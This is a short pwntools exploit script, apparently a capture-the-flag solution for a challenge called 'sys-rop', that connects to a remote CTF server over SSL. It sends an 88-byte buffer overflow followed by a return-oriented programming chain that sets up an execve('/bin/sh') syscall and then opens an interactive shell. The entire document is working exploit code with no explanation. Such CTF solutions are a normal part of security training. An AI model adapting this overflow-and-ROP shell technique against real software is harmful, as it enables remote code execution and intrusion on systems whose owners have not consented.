from pwn import *

elf = ELF('./chall')
context.binary = elf
#p = gdb.debug(elf.path, gdbscript='b main')
p = remote(port=443, host='sys-rop.bsides.shellmates.club', ssl=True)


p.recv()


padding = b'A' * 88

pop_rdi = p64(0x000000000040107f)

bin_sh = p64(0x402010)

pop_rsi = p64(0x0000000000401081)

SYS_system = p64(59)

syscall = p64(0x000000000040100a)

pop_rax = p64(0x0000000000401085)

pop_rdx = p64(0x0000000000401083)

p.sendline(padding + pop_rax + SYS_system + pop_rdi + bin_sh + pop_rsi + p64(0) + pop_rdx + p64(0) + syscall)

p.recv()

p.interactive()
